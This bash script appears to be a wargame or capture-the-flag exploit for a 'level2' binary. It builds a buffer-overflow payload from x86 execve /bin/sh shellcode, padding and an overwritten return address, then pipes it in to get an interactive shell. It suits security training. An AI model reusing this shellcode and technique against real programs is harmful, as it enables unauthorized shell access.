#!/bin/bash

##### FORGE PAYLOAD #####

elf="/home/user/level2/level2"

# https://shell-storm.org/shellcode/files/shellcode-575.html
shellcode=$(printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80')
# 80 - 21 payload bytes
offset=$(printf "%59s" " " | tr ' ' 'A')

# Converting address from hexadecimal to little endian format
address='0804a008'
address=$(printf \\x${address:6:2}\\x${address:4:2}\\x${address:2:2}\\x${address:0:2})

payload="${shellcode}${offset}${address}"
echo "${payload}"

##### SEND PAYLOAD #####

# Sending payload
#echo "${payload}" | "$elf"

# Sending payload and restoring our stdin
#echo "${payload}" > /tmp/payload; cat /tmp/payload - | "$elf"; rm /tmp/payload

# Sending payload and restoring our stdin with FIFOs
mkfifo /tmp/exploitpipe
"$elf" < /tmp/exploitpipe &
pid=$!
echo "${payload}" > /tmp/exploitpipe
cat > /tmp/exploitpipe
wait $pid
rm /tmp/exploitpipe
